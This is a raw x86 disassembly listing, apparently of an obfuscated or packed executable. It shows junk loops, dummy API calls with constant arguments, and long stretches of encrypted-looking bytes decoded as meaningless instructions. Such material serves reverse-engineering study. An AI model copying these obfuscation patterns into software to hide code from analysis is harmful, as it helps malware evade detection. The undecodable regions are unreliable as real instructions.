  405005:	mov    DWORD PTR ds:0x433837,0x2c13
  40500f:	push   ebx
  405010:	mov    DWORD PTR ds:0x4337ef,0x2429
  40501a:	jmp    0x40683a
  40501f:	mov    edx,DWORD PTR [ebp-0x8]
  405022:	and    DWORD PTR ds:0x433727,0x0
  40502c:	mov    edi,DWORD PTR ds:0x433727
  405032:	inc    edi
  405033:	mov    DWORD PTR ds:0x433727,edi
  405039:	cmp    DWORD PTR ds:0x433727,0x6
  405040:	jne    0x40505d
  405046:	push   DWORD PTR [ebp-0x14]
  405049:	push   DWORD PTR [ebp-0x10]
  40504c:	push   DWORD PTR [ebp-0xc]
  40504f:	push   DWORD PTR [ebp-0x18]
  405052:	push   0x82f7
  405057:	call   DWORD PTR ds:0x41236c
  40505d:	cmp    DWORD PTR ds:0x433727,0x5
  405064:	jne    0x405079
  40506a:	xor    edi,edi
  40506c:	xor    edi,DWORD PTR ds:0x433727
  405072:	inc    edi
  405073:	mov    DWORD PTR ds:0x433727,edi
  405079:	cmp    DWORD PTR ds:0x433727,0x17
  405080:	jb     0x40502c
  405086:	xor    edi,edi
  405088:	add    edi,DWORD PTR ds:0x4337ff
  40508e:	add    DWORD PTR ds:0x4337bb,edi
  405094:	mov    edi,DWORD PTR [ebp-0x10]
  405097:	sub    edi,edx
  405099:	mov    edx,DWORD PTR [ebp-0x4]
  40509c:	xor    edx,eax
  40509e:	add    edx,ecx
  4050a0:	mov    DWORD PTR ds:0x4337eb,0x78fa
  4050aa:	cmp    edi,edx
  4050ac:	mov    DWORD PTR ds:0x43383b,0x49ec
  4050b6:	jb     0x40685e
  4050bc:	mov    edx,DWORD PTR [ebp-0x28]
  4050bf:	mov    edi,DWORD PTR [ebp-0x4]
  4050c2:	xor    edx,eax
  4050c4:	inc    DWORD PTR ds:0x43383b
  4050ca:	xor    edi,eax
  4050cc:	not    DWORD PTR ds:0x4337fb
  4050d2:	add    edi,ecx
  4050d4:	add    edx,ecx
  4050d6:	adc    ebx,0x69d8
  4050dc:	imul   edx,edi
  4050df:	mov    edi,DWORD PTR [ebp-0x8]
  4050e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4050e5:	sbb    DWORD PTR ds:0x433727,0x4337b7
  4050ef:	sub    ebx,edi
  4050f1:	mov    DWORD PTR ds:0x43371f,0x4726
  4050fb:	cmp    ebx,edx
  4050fd:	mov    DWORD PTR ds:0x4337eb,0x2e42
  405107:	ja     0x4054d4
  40510d:	and    DWORD PTR ds:0x4337ff,0x0
  405117:	jmp    0x40512b
  40511c:	xor    edx,edx
  40511e:	add    edx,DWORD PTR ds:0x4337ff
  405124:	inc    edx
  405125:	mov    DWORD PTR ds:0x4337ff,edx
  40512b:	cmp    DWORD PTR ds:0x4337ff,0x17
  405132:	jae    0x40515a
  405138:	cmp    DWORD PTR ds:0x4337ff,0x18
  40513f:	jne    0x405155
  405145:	push   0x19d0
  40514a:	push   0x338d
  40514f:	call   DWORD PTR ds:0x412004
  405155:	jmp    0x40511c
  40515a:	mov    edx,DWORD PTR [ebp-0x4]
  40515d:	sbb    DWORD PTR ds:0x4337eb,0x43376f
  405167:	xor    edx,eax
  405169:	xor    DWORD PTR ds:0x4337e7,0x55d1
  405173:	jmp    0x4054cd
  405178:	cdq    
  405179:	jp     0x4051e8
  40517b:	pushf  
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	imul   ebp,DWORD PTR [ecx+0x7b],0x879a2b7f
  405184:	adc    DWORD PTR [edi],edi
  405186:	std    
  405187:	stos   BYTE PTR es:[edi],al
  405188:	hlt    
  405189:	sub    BYTE PTR [esi+0x7e],bh
  40518c:	xor    edi,DWORD PTR [ebp+0x7e]
  40518f:	jle    0x405207
  405191:	(bad)  
  405192:	adc    al,0xfd
  405194:	loope  0x405177
  405196:	(bad)  
  405197:	xchg   edx,eax
  405198:	adc    DWORD PTR [ecx+eiz*2+0x5e],esi
  40519c:	cmp    BYTE PTR ds:0x9a601ade,al
  4051a2:	jecxz  0x40518a
  4051a4:	lods   al,BYTE PTR ds:[esi]
  4051a5:	sub    DWORD PTR [eax+0x106a0d83],edi
  4051ab:	sbb    ecx,0xffffffc4
  4051ae:	xchg   edx,eax
  4051af:	mov    bh,0x97
  4051b1:	js     0x4051ff
  4051b3:	or     al,0x39
  4051b5:	mov    ebp,0xf95002a4
  4051ba:	mov    bx,WORD PTR [ebx]
  4051bd:	adc    eax,0xc6b5e848
  4051c2:	mov    ebp,0xb8dc3ed2
  4051c7:	stc    
  4051c8:	fwait
  4051c9:	sti    
  4051ca:	xchg   ebx,eax
  4051cb:	cmp    DWORD PTR [eax],0xffffffaf
  4051ce:	data16 (bad) 
  4051d0:	call   0x64c666dc
  4051d5:	mov    edx,0xbe73f6dc
  4051da:	jp     0x4051d5
  4051dc:	iret   
  4051dd:	dec    esp
  4051de:	xor    al,0xc5
  4051e0:	xor    al,0xad
  4051e2:	add    bh,ch
  4051e4:	mov    ah,0x88
  4051e6:	xchg   ch,ah
  4051e8:	cmp    al,0xb9
  4051ea:	mov    al,0x2a
  4051ec:	aam    0x29
  4051ee:	xor    bl,BYTE PTR [eax-0x54]
  4051f1:	popa   
  4051f2:	sbb    BYTE PTR [ebx],dh
  4051f4:	sbb    BYTE PTR [edx+0x3b27cee8],ch
  4051fa:	fist   DWORD PTR [esi]
  4051fc:	sbb    al,0x6
  4051fe:	stos   DWORD PTR es:[edi],eax
  4051ff:	js     0x40524b
  405201:	scas   eax,DWORD PTR es:[edi]
  405202:	mov    DWORD PTR [esi],ebp
  405204:	aas    
  405205:	repnz sbb DWORD PTR [eax-0x68039d33],esi
  40520c:	sub    BYTE PTR [edi],cl
  40520e:	fwait
  40520f:	mov    ebp,0x41825562
  405214:	sub    al,0x17
  405216:	xchg   BYTE PTR [ebp-0x4d9a99b9],ch
  40521c:	mov    al,0x9b
  40521e:	bound  edi,QWORD PTR ds:0xea3dd3e2
  405224:	mov    dh,0x2a
  405226:	jl     0x4051b9
  405228:	jg     0x40523b
  40522a:	xchg   edi,eax
  40522b:	cs jmp 0xdaba:0xbb9c4e8d
  405233:	scas   eax,DWORD PTR es:[edi]
  405234:	int    0xbd
  405236:	push   sp
  405238:	aad    0x56
  40523a:	test   DWORD PTR [ebp-0x68],esi
  40523d:	pop    ecx
  40523e:	stc    
  40523f:	call   0x37c0e342
  405244:	pop    ds
  405245:	lods   al,BYTE PTR ds:[esi]
  405246:	add    dl,ah
  405248:	jge    0x4052b8
  40524a:	test   eax,0x322b504d
  40524f:	xor    esp,DWORD PTR [esi+0x5d]
  405252:	jge    0x405229
  405254:	sbb    eax,0x6504ed36
  405259:	repnz (bad) 
  40525b:	and    bl,bl
  40525d:	pop    ss
  40525e:	mov    al,al
  405260:	aam    0x38
  405262:	jmp    0x4052bd
  405264:	not    DWORD PTR [ecx-0x43]
  405267:	ror    DWORD PTR [ebx+0x54],1
  40526a:	inc    ebx
  40526b:	ds push edx
  40526d:	sbb    ebp,DWORD PTR [ebx]
  40526f:	inc    ecx
  405270:	ds loopne 0x4052eb
  405273:	into   
  405274:	jmp    0x405225
  405276:	pop    edx
  405277:	sbb    DWORD PTR [ebp*4-0x4668a896],esp
  40527e:	mov    esi,ebp
  405280:	retf   
  405281:	fstp   QWORD PTR [esi]
  405283:	xchg   ecx,eax
  405284:	dec    ecx
  405285:	jbe    0x4052ac
  405287:	leave  
  405288:	popa   
  405289:	cdq    
  40528a:	mov    bl,cl
  40528c:	fimul  WORD PTR [esi]
  40528e:	pavgb  mm0,QWORD PTR [edi-0x41]
  405292:	cmp    DWORD PTR [eax-0xf],ecx
  405295:	jnp    0x40529d
  405297:	jae    0x40528f
  405299:	daa    
  40529a:	sub    edi,DWORD PTR [eax-0x3eb0590]
  4052a0:	in     al,0x20
  4052a2:	jo     0x405243
  4052a4:	popf   
  4052a5:	out    0x61,al
  4052a7:	sti    
  4052a8:	mov    ds:0x4768d46f,al
  4052ad:	and    dh,BYTE PTR [edx+0x6d]
  4052b0:	fdivr  DWORD PTR ds:0x563956bb
  4052b6:	popf   
  4052b7:	sub    WORD PTR [eax+0x254cf5af],ax
  4052be:	xlat   BYTE PTR ds:[ebx]
  4052bf:	adc    BYTE PTR [esp+edi*4+0x6913f5f5],0xd9
  4052c7:	adc    DWORD PTR [esi+ebp*2-0x69],esi
  4052cb:	popa   
  4052cc:	push   es
  4052cd:	jo     0x40526b
  4052cf:	sbb    ecx,DWORD PTR [ebp+0x68]
  4052d2:	call   0x3e4d9a03
  4052d7:	cmp    edx,ebx
  4052d9:	test   eax,0x3f08cb20
  4052de:	hlt    
  4052df:	call   0x448e:0x54bbdb42
  4052e6:	leave  
  4052e7:	or     DWORD PTR [ebx-0x74ffbfc8],edi
  4052ed:	loope  0x4052dd
  4052ef:	retf   0xc608
  4052f2:	addr16 ret 
  4052f4:	and    DWORD PTR [eax-0x42],ecx
  4052f7:	inc    DWORD PTR [eax+eax*2-0x457bcb10]
  4052fe:	dec    esp
  4052ff:	stos   BYTE PTR es:[edi],al
  405300:	fld    QWORD PTR [edx+0x4a]
  405303:	pop    eax
  405304:	jb     0x405376
  405306:	push   ecx
  405307:	hlt    
  405308:	fdivr  DWORD PTR [ebx+edx*8+0xe389369]
  40530f:	ins    BYTE PTR es:[edi],dx
  405310:	sub    eax,0xa8099aad
  405315:	or     DWORD PTR [esi+eax*8],esi
  405318:	sahf   
  405319:	stos   BYTE PTR es:[edi],al
  40531a:	mov    bh,cl
  40531c:	push   esi
  40531d:	nop
  40531e:	dec    DWORD PTR [ebp+0x5c]
  405321:	in     al,0x24
  405323:	call   0x2ac:0xa85a6f8d
  40532a:	cmp    eax,0xb2be4f29
  40532f:	pop    ebx
  405330:	sub    BYTE PTR [ecx],al
  405332:	lock mov dl,0x65
  405335:	cmp    DWORD PTR [edx+0x27],edi
  405338:	in     eax,0xcc
  40533a:	mov    al,ds:0xf29f6983
  40533f:	pop    edi
  405340:	(bad)  
  405341:	aam    0xf2
  405343:	fs ins DWORD PTR es:[edi],dx
  405345:	mov    DWORD PTR [esi-0x5e],esp
  405348:	push   cs
  405349:	les    esi,FWORD PTR [edi]
  40534b:	aad    0x8c
  40534d:	idiv   DWORD PTR [ebp+esi*8+0x6377d7eb]
  405354:	repnz xor eax,0xde03df9
  40535a:	pop    ebx
  40535b:	sbb    esi,DWORD PTR [ebx]
  40535d:	mov    ebp,0xd3aa81ac
  405362:	shl    BYTE PTR [ecx],0xc0
  405365:	arpl   dx,cx
  405367:	in     al,dx
  405368:	out    dx,al
  405369:	mov    DWORD PTR [edi-0x22],edx
  40536c:	sidtw  [ecx+0x51]
  405371:	pop    ebp
  405372:	gs add al,0x3
  405375:	jne    0x4053be
  405377:	pop    eax
  405378:	stos   BYTE PTR es:[edi],al
  405379:	outs   dx,BYTE PTR ds:[esi]
  40537a:	shr    esi,0x6f
  40537d:	and    BYTE PTR [ebx-0x4aac2650],al
  405383:	and    dh,al
  405385:	mov    eax,0x34cf12ed
  40538a:	mov    esi,DWORD PTR [esi+0x5b4fa124]
  405390:	xor    al,0xfa
  405392:	stc    
  405393:	pop    ds
  405394:	mov    esi,0xb090e29
  405399:	test   al,0x1d
  40539b:	or     eax,0x989287be
  4053a0:	push   ecx
  4053a1:	mov    ch,0xff
  4053a3:	data16 adc ch,al
  4053a6:	cmp    ah,0x62
  4053a9:	(bad)  
  4053aa:	jae    0x40532e
  4053ac:	push   ecx
  4053ad:	mov    dl,0x9b
  4053af:	daa    
  4053b0:	jp     0x40541d
  4053b2:	ins    DWORD PTR es:[edi],dx
  4053b3:	(bad)  
  4053b4:	adc    bh,bh
  4053b6:	push   0xc1f31337
  4053bb:	cld    
  4053bc:	jmp    0x40536c
  4053be:	adc    esp,DWORD PTR [edx+esi*1-0x48]
  4053c2:	into   
  4053c3:	iretw  
  4053c5:	repz jnp 0x4053ea
  4053c8:	sbb    bl,BYTE PTR [edi+ebp*2+0x67]
  4053cc:	imul   edx,DWORD PTR [ebx+edi*4+0x52b6f8cd],0xffffffaa
  4053d4:	test   al,0xd0
  4053d6:	int    0xf4
  4053d8:	mov    cl,BYTE PTR [ecx-0x4c6c37c3]
  4053de:	call   0xabe6:0xd61ff6cf
  4053e5:	pop    es
  4053e6:	out    0xf3,al
  4053e8:	jmp    0x40544d
  4053ea:	push   ebx
  4053eb:	jne    0x4053b9
  4053ed:	add    ecx,DWORD PTR [edi+0x25]
  4053f0:	sub    DWORD PTR [ecx-0x504e5f5b],0x4a4eb59a
  4053fa:	retf   
  4053fb:	mov    DWORD PTR [eax+0x70d20778],edx
  405401:	push   es
  405402:	loopne 0x405470
  405404:	xchg   esi,eax
  405405:	clc    
  405406:	out    0xda,eax
  405408:	pop    esi
  405409:	sub    ebp,DWORD PTR [eax-0x7248e471]
  40540f:	add    bl,BYTE PTR [esi-0x3c1bd9ac]
  405415:	(bad)  
  405416:	cmp    al,BYTE PTR [eax-0xc]
  405419:	add    BYTE PTR [eax+edx*1],dh
  40541c:	push   0x4c2822ee
  405421:	inc    edx
  405422:	std    
  405423:	and    eax,0xc6c01981
  405428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405429:	cvtdq2ps xmm7,XMMWORD PTR [ebx+eiz*1-0x40bdc45e]
  405431:	push   eax
  405432:	in     eax,dx
  405433:	pop    esp
  405434:	pop    edi
  405435:	or     al,0x63
  405437:	hlt    
  405438:	es sub al,0x52
  40543b:	test   eax,0x1070e1ac
  405440:	mov    ebp,0x79bbfc31
  405445:	or     BYTE PTR ds:0xfe7dce57,dh
  40544b:	dec    ebp
  40544c:	cmp    DWORD PTR ds:0xf29f0f13,ecx
  405452:	push   esi
  405453:	inc    eax
  405454:	mul    BYTE PTR [ebx+0x5d6c51e8]
  40545a:	in     eax,0xee
  40545c:	lea    edx,[ecx-0x58]
  40545f:	cmp    ebp,DWORD PTR [eax]
  405461:	lahf   
  405462:	js     0x4054a6
  405464:	push   ebx
  405465:	in     eax,dx
  405466:	mov    DWORD PTR [ecx+0x78],ebp
  405469:	aas    
  40546a:	inc    ebx
  40546b:	pusha  
  40546c:	es mov dl,0xf0
  40546f:	(bad)  
  405470:	enter  0x75a4,0x15
  405474:	adc    al,0xf
  405476:	cli    
  405477:	push   edx
  405478:	pusha  
  405479:	fcmovnbe st,st(2)
  40547b:	(bad)  
  40547c:	lods   al,BYTE PTR ds:[esi]
  40547d:	ret    0x6e5e
  405480:	(bad)  
  405481:	call   0x5e8e:0xb4bc4921
  405488:	xor    ah,BYTE PTR ds:0x119eca3a
  40548e:	jnp    0x4054de
  405490:	out    0x67,al
  405492:	inc    esp
  405493:	call   0xd4df28e8
  405498:	pop    edx
  405499:	ss aaa 
  40549b:	jp     0x405451
  40549d:	push   cs
  40549e:	addr16 xchg ebp,eax
  4054a0:	inc    edx
  4054a1:	addr16 cmp al,0x25
  4054a4:	lahf   
  4054a5:	cdq    
  4054a6:	in     eax,0xbd
  4054a8:	xlat   BYTE PTR ds:[ebx]
  4054a9:	pop    ss
  4054aa:	in     al,0x42
  4054ac:	jl     0x40545b
  4054ae:	sbb    BYTE PTR [edx+0x7d],dl
  4054b1:	push   ecx
  4054b2:	lea    eax,[eax+ebp*2]
  4054b5:	inc    esp
  4054b6:	popa   
  4054b7:	xchg   ebx,eax
  4054b8:	cdq    
  4054b9:	imul   esp,DWORD PTR [ecx],0x5f9c037b
  4054bf:	xor    eax,0xad1a2f35
  4054c4:	jle    0x405470
  4054c6:	(bad)  [edx-0x14]
  4054c9:	mov    eax,0x3bf432b
  4054ce:	shr    ecx,1
  4054d0:	push   ss
  4054d1:	sldt   WORD PTR [eax]
  4054d4:	mov    edx,DWORD PTR [ebp-0x2c]
  4054d7:	mov    edi,DWORD PTR [ebp-0x4]
  4054da:	xor    edx,eax
  4054dc:	movzx  ebx,BYTE PTR ds:0x4337e7
  4054e3:	or     DWORD PTR ds:0x433803,ebx
  4054e9:	xor    edi,eax
  4054eb:	and    DWORD PTR ds:0x4337f3,0x0
  4054f5:	xor    ebx,ebx
  4054f7:	add    ebx,DWORD PTR ds:0x4337f3
  4054fd:	inc    ebx
  4054fe:	mov    DWORD PTR ds:0x4337f3,ebx
  405504:	cmp    DWORD PTR ds:0x4337f3,0x6
  40550b:	jne    0x40552b
  405511:	push   0x1804
  405516:	push   0x80d8
  40551b:	push   0x74bc
  405520:	push   0x5a14
  405525:	call   DWORD PTR ds:0x412370
  40552b:	cmp    DWORD PTR ds:0x4337f3,0x5
  405532:	jne    0x405545
  405538:	mov    ebx,DWORD PTR ds:0x4337f3
  40553e:	inc    ebx
  40553f:	mov    DWORD PTR ds:0x4337f3,ebx
  405545:	cmp    DWORD PTR ds:0x4337f3,0x1e
  40554c:	jb     0x4054f5
  405552:	mov    DWORD PTR ds:0x4337f7,0x387c
  40555c:	add    edi,ecx
  40555e:	add    edx,ecx
  405560:	imul   edx,edi
  405563:	mov    edi,DWORD PTR [ebp-0x8]
  405566:	and    DWORD PTR ds:0x4337b7,0x0
  405570:	mov    ebx,DWORD PTR ds:0x4337b7
  405576:	inc    ebx
  405577:	mov    DWORD PTR ds:0x4337b7,ebx
  40557d:	cmp    DWORD PTR ds:0x4337b7,0x2c
  405584:	jne    0x4055b0
  40558a:	push   DWORD PTR [ebp-0x28]
  40558d:	push   0x7933
  405592:	push   0x433946
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x24]
  40559d:	push   DWORD PTR [ebp-0x1c]
  4055a0:	push   0x42e0
  4055a5:	push   0x392f
  4055aa:	call   DWORD PTR ds:0x412374
  4055b0:	cmp    DWORD PTR ds:0x4337b7,0x1e
  4055b7:	jb     0x405570
  4055bd:	mov    ebx,DWORD PTR [ebp-0x10]
  4055c0:	sub    ebx,edi
  4055c2:	cmp    ebx,edx
  4055c4:	ja     0x4055d2
  4055ca:	mov    edx,DWORD PTR [ebp-0x28]
  4055cd:	jmp    0x4063dc
  4055d2:	mov    edx,DWORD PTR [ebp-0x30]
  4055d5:	mov    edi,DWORD PTR [ebp-0x4]
  4055d8:	xor    edx,eax
  4055da:	xor    edi,eax
  4055dc:	add    edi,ecx
  4055de:	add    edx,ecx
  4055e0:	imul   edx,edi
  4055e3:	mov    edi,DWORD PTR [ebp-0x8]
  4055e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4055e9:	sub    ebx,edi
  4055eb:	cmp    ebx,edx
  4055ed:	ja     0x4055fb
  4055f3:	mov    edx,DWORD PTR [ebp-0x2c]
  4055f6:	jmp    0x4063dc
  4055fb:	mov    edx,DWORD PTR [ebp-0x34]
  4055fe:	mov    edi,DWORD PTR [ebp-0x4]
  405601:	xor    edx,eax
  405603:	xor    edi,eax
  405605:	add    edi,ecx
  405607:	add    edx,ecx
  405609:	imul   edx,edi
  40560c:	mov    edi,DWORD PTR [ebp-0x8]
  40560f:	mov    ebx,DWORD PTR [ebp-0x10]
  405612:	sub    ebx,edi
  405614:	cmp    ebx,edx
  405616:	ja     0x40597e
  40561c:	jmp    0x405976
  405621:	(bad)  [eax+0x65]
  405624:	pop    eax
  405625:	jne    0x405698
  405627:	loope  0x405672
  405629:	clc    
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	dec    ebp
  40562c:	push   0x27b3bdf6
  405631:	test   eax,0x337e7e37
  405636:	jge    0x4056b6
  405638:	jle    0x4055d1
  40563a:	nop
  40563b:	lahf   
  40563c:	cs sti 
  40563e:	arpl   sp,cx
  405640:	cli    
  405641:	sub    ch,BYTE PTR [esi-0x70b4bde5]
  405647:	inc    ecx
  405648:	jmp    0x79231a92
  40564d:	retf   
  40564e:	or     BYTE PTR [esi-0x41],al
  405651:	push   edx
  405652:	icebp  
  405653:	rol    BYTE PTR [ebx+eax*1-0x6b],0xeb
  405658:	lds    eax,FWORD PTR [ebp-0x6530414]
  40565e:	daa    
  40565f:	pop    ss
  405660:	clc    
  405661:	and    bl,BYTE PTR [edx-0x3f]
  405664:	inc    eax
  405665:	adc    al,0x95
  405667:	ins    BYTE PTR es:[edi],dx
  405668:	repnz pop edi
  40566a:	ds pushf 
  40566c:	ds into 
  40566e:	jl     0x405657
  405670:	call   0x3cfb:0x646f4e56
  405677:	push   cs
  405678:	pshufw mm1,QWORD PTR [eax+eiz*4-0x9],0x7d
  40567e:	lock scas eax,DWORD PTR es:[edi]
  405680:	leave  
  405681:	cmp    eax,0x38be35ad
  405686:	xchg   ecx,eax
  405687:	push   eax
  405688:	jmp    0x665:0x78285d0a
  40568f:	inc    edx
  405690:	in     al,dx
  405691:	les    edi,FWORD PTR [ecx+0x31]
  405694:	enter  0xfca8,0xdd
  405698:	or     esi,DWORD PTR ds:0x61de6710
  40569e:	pusha  
  40569f:	adc    al,BYTE PTR [edi]
  4056a1:	xchg   edi,eax
  4056a2:	in     al,dx
  4056a3:	xchg   ebp,eax
  4056a4:	in     eax,dx
  4056a5:	inc    edx
  4056a6:	push   es
  4056a7:	xchg   edi,eax
  4056a8:	leave  
  4056a9:	jecxz  0x4056c1
  4056ab:	aad    0xc6
  4056ad:	jl     0x405647
  4056af:	loopne 0x40564b
  4056b1:	adc    bl,bh
  4056b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056b4:	jle    0x4056a2
  4056b6:	and    DWORD PTR [ecx-0x2328b5a],edx
  4056bc:	or     dh,bl
  4056be:	adc    al,0x36
  4056c0:	jmp    0x405705
  4056c2:	xor    BYTE PTR [eax+ecx*1],0x73
  4056c6:	dec    ebp
  4056c7:	retf   
  4056c8:	nop
  4056c9:	(bad)
  4056cc:	or     BYTE PTR [esp+edx*4+0x4a788411],bl
  4056d3:	push   ds
  4056d4:	sbb    BYTE PTR [ebx],0x8a
  4056d7:	aad    0xcf
  4056d9:	cmp    al,0xd7
  4056db:	out    0x92,al
  4056dd:	push   ds
  4056de:	stos   BYTE PTR es:[edi],al
  4056df:	stos   DWORD PTR es:[edi],eax
  4056e0:	nop
  4056e1:	test   eax,0x556b741
  4056e6:	inc    ebx
  4056e7:	std    
  4056e8:	gs ss jbe 0x4056e8
  4056ec:	aas    
  4056ed:	push   edi
  4056ee:	ret    
  4056ef:	or     eax,DWORD PTR [ebx+0x7f]
  4056f2:	in     al,dx
  4056f3:	retf   0x8afb
  4056f6:	sti    
  4056f7:	mov    dl,0x5d
  4056f9:	clc    
  4056fa:	bound  eax,QWORD PTR [edx]
  4056fc:	pop    esp
  4056fd:	mov    eax,ds:0x7b896d8d
  405702:	inc    eax
  405703:	add    ebx,DWORD PTR [edx]
  405705:	aaa    
  405706:	pop    edx
  405707:	mov    ecx,0xe9407c6c
  40570c:	scas   al,BYTE PTR es:[edi]
  40570d:	mov    DWORD PTR [eax+0x894262],edx
  405713:	mov    bl,0x21
  405715:	inc    eax
  405716:	into   
  405717:	fs iret 
  405719:	ja     0x4056de
  40571b:	pusha  
  40571c:	and    al,ah
  40571e:	xor    ebp,DWORD PTR [edx+0xf]
  405721:	inc    esi
  405722:	jnp    0x4056cd
  405724:	xchg   ebp,eax
  405725:	jecxz  0x405756
  405727:	pop    esp
  405728:	lock mov al,ds:0x49bc1130
  40572e:	jmp    DWORD PTR [ecx+0x4e]
  405731:	mov    BYTE PTR [edi-0x34],0x7f
  405735:	test   DWORD PTR [edx+0x40],0xd31857c1
  40573c:	cmp    ebx,ecx
  40573e:	lahf   
  40573f:	cdq    
  405740:	jo     0x40570e
  405742:	inc    edi
  405743:	adc    eax,0x7d9cc28e
  405748:	sub    ecx,DWORD PTR [edi+0x68]
  40574b:	stos   DWORD PTR es:[edi],eax
  40574c:	xor    BYTE PTR [esi],bh
  40574e:	sbb    edx,DWORD PTR [edi+0x1b]
  405751:	xchg   esi,eax
  405752:	inc    esi
  405753:	jecxz  0x405714
  405755:	sub    BYTE PTR [edx-0x558c728f],bl
  40575b:	popf   
  40575c:	out    dx,al
  40575d:	loopne 0x40578f
  40575f:	mov    WORD PTR [ecx+0x29],cs
  405762:	cs adc al,0x55
  405765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405766:	arpl   WORD PTR ds:0xba325318,si
  40576c:	or     DWORD PTR [edx-0x247866eb],esp
  405772:	mov    WORD PTR [esi],ds
  405774:	in     al,dx
  405775:	mov    ?,edi
  405777:	mov    ebx,?
  405779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40577a:	xchg   esi,eax
  40577b:	mov    al,cl
  40577d:	mov    BYTE PTR [edi-0x20],dh
  405780:	stc    
  405781:	jns    0x40571b
  405783:	pop    ecx
  405784:	push   edi
  405785:	int    0xce
  405787:	mov    al,0x42
  405789:	push   ecx
  40578a:	stos   DWORD PTR es:[edi],eax
  40578b:	retf   0x300
  40578e:	mov    ebp,0xe9d551da
  405793:	dec    eax
  405794:	leave  
  405795:	xor    eax,0x1299e7e9
  40579a:	pop    esi
  40579b:	mov    al,ds:0x9b3fa1d0
  4057a0:	dec    bp
  4057a2:	out    0x6,eax
  4057a4:	ret    
  4057a5:	pop    edi
  4057a6:	sbb    DWORD PTR [esi],esi
  4057a8:	sub    cl,bl
  4057aa:	push   es
  4057ab:	(bad)  
  4057ac:	push   edi
  4057ad:	push   esi
  4057ae:	mov    ds:0x7a63bcb0,al
  4057b3:	mov    esi,0xe78b006a
  4057b8:	push   edi
  4057b9:	mov    ch,0x82
  4057bb:	in     eax,dx
  4057bc:	rol    BYTE PTR [ecx],0x10
  4057bf:	(bad)  
  4057c0:	xchg   edx,eax
  4057c1:	mov    esi,0x3b7c945f
  4057c6:	sub    BYTE PTR [ebx-0x66],dh
  4057c9:	and    BYTE PTR [ecx+0x4e0ca7a0],al
  4057cf:	cmpxchg ah,ah
  4057d2:	xor    ebx,esp
  4057d4:	pop    esp
  4057d5:	xor    al,0x5d
  4057d7:	fwait
  4057d8:	xchg   ebx,eax
  4057d9:	retf   0xe142
  4057dc:	mov    dl,0x7e
  4057de:	jo     0x4057c4
  4057e0:	push   esp
  4057e1:	sahf   
  4057e2:	ins    DWORD PTR es:[edi],dx
  4057e3:	add    eax,0x4ada9c93
  4057e8:	xchg   BYTE PTR [edx],dh
  4057ea:	xor    ebp,DWORD PTR [ecx+0x265318ff]
  4057f0:	jge    0x4057cd
  4057f2:	ins    DWORD PTR es:[edi],dx
  4057f3:	in     al,0x15
  4057f5:	popa   
  4057f6:	push   edi
  4057f7:	repz pushf 
  4057f9:	jmp    0xb13ba2c1
  4057fe:	xor    DWORD PTR [edi],ebp
  405800:	inc    esi
  405801:	icebp  
  405802:	mov    dl,0x96
  405804:	inc    ebp
  405805:	sub    dh,bh
  405807:	or     ah,BYTE PTR [edx-0x6d]
  40580a:	out    0xb7,al
  40580c:	sub    al,0x26
  40580e:	fdivr  st(6),st
  405810:	add    al,0x2b
  405812:	imul   edi,DWORD PTR [edi+0x68d09eb7],0x2e
  405819:	sub    DWORD PTR [ebx],ebx
  40581b:	or     bl,BYTE PTR ds:0x936d21d4
  405821:	dec    esp
  405822:	cmc    
  405823:	inc    edi
  405824:	mov    ebx,DWORD PTR [ebp-0x24]
  405827:	arpl   WORD PTR [edi+0x5bf8e7b4],ax
  40582d:	xchg   ecx,eax
  40582e:	sbb    eax,0xc20e89db
  405833:	scas   eax,DWORD PTR es:[edi]
  405834:	fild   QWORD PTR [ecx-0x4ce9c3b6]
  40583a:	jg     0x4057f8
  40583c:	loopne 0x40585b
  40583e:	xlat   BYTE PTR ds:[ebx]
  40583f:	xor    DWORD PTR [ebp-0x294b8a8f],0x334af1d8
  405849:	bound  eax,QWORD PTR [ebp+esi*8-0x29]
  40584d:	jb     0x40581b
  40584f:	adc    eax,0x3f293d01
  405854:	into   
  405855:	bound  ecx,QWORD PTR [ebx]
  405857:	ret    0x4348
  40585a:	clc    
  40585b:	and    BYTE PTR [edx-0x56],cl
  40585e:	jle    0x40589d
  405860:	mov    edx,0x37e00263
  405865:	outs   dx,BYTE PTR ds:[esi]
  405866:	adc    eax,0x6c268fe9
  40586b:	jb     0x405810
  40586d:	dec    ecx
  40586e:	pop    eax
  40586f:	push   eax
  405870:	repnz in al,0x7c
  405873:	jb     0x4058c9
  405875:	js     0x405870
  405877:	rcr    BYTE PTR [eax],1
  405879:	dec    edx
  40587a:	lods   eax,DWORD PTR ds:[esi]
  40587b:	mov    dh,0x36
  40587d:	fdivr  QWORD PTR [ebx-0xd]
  405880:	call   0xaf77:0x7d338097
  405887:	leave  
  405888:	mov    esi,esi
  40588a:	adc    DWORD PTR [esi+edx*1],esp
  40588d:	jmp    0x89b6:0xadf763f0
  405894:	pop    ebp
  405895:	cmp    ebp,ebp
  405897:	into   
  405898:	sub    bh,dl
  40589a:	jne    0x4058af
  40589c:	repnz loop 0x40588c
  40589f:	jg     0x40591d
  4058a1:	(bad)  
  4058a2:	enter  0x5f89,0x4c
  4058a6:	xor    al,0xce
  4058a8:	cmp    al,0x8c
  4058aa:	(bad)  
  4058ab:	in     al,0x9b
  4058ad:	mov    ah,BYTE PTR [eax-0x59fede88]
  4058b3:	jmp    0x405919
  4058b5:	push   ebx
  4058b6:	push   cs
  4058b7:	sub    al,0x96
  4058b9:	jl     0x40589c
  4058bb:	les    ebx,FWORD PTR [ebp-0x33]
  4058be:	cmp    BYTE PTR [eax+0x57c23f49],0x99
  4058c5:	sub    eax,0xc34e87ea
  4058ca:	cmp    al,0x17
  4058cc:	ds dec esp
  4058ce:	mov    ebp,DWORD PTR [ecx+0x42018e18]
  4058d4:	adc    al,0xb4
  4058d6:	add    BYTE PTR [ecx+0x417280b7],ch
  4058dc:	dec    edi
  4058dd:	cmp    eax,0x60f7fa0f
  4058e2:	jns    0x4058cc
  4058e4:	xchg   BYTE PTR [ebp-0x38f6f022],bl
  4058ea:	lock pusha 
  4058ec:	iret   
